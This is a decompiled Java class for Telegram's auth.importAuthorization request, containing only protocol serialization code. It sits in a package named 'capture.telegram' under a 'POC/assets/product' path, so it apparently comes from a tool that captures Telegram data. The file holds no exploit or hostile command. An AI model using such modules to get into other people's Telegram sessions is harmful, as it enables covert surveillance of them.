package com.vvt.capture.telegram.internal;

public class TLRPC$TL_auth_importAuthorization
  extends TLObject
{
  public static int constructor = -470837741;
  public byte[] bytes;
  public int id;
  
  public TLObject deserializeResponse(AbstractSerializedData paramAbstractSerializedData, int paramInt, boolean paramBoolean)
  {
    return TLRPC.TL_auth_authorization.TLdeserialize(paramAbstractSerializedData, paramInt, paramBoolean);
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    i = this.id;
    paramAbstractSerializedData.writeInt32(i);
    byte[] arrayOfByte = this.bytes;
    paramAbstractSerializedData.writeByteArray(arrayOfByte);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_auth_importAuthorization.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */